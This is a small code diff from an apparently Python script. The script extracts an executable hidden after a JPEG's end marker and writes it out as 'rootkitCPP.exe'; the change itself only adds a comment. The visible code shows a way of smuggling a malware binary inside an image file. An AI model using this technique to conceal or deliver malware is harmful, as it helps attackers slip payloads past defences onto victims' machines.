@@ -18,6 +18,6 @@ splitValues = convertedValues.split("ffd9", 1) #splits between jpg (minus the ff
 exe = splitValues[1] #b' is for binascii to recognize
 
 exeFile = open("rootkitCPP.exe", "wb") #'wb" = write in binary mode
-exeFile.write(bytearray(bytes.fromhex(exe[:-1])))
+exeFile.write(bytearray(bytes.fromhex(exe[:-1]))) #converts back to binary and removes unnecessary ' from end of exe string
 
 exeFile.close()
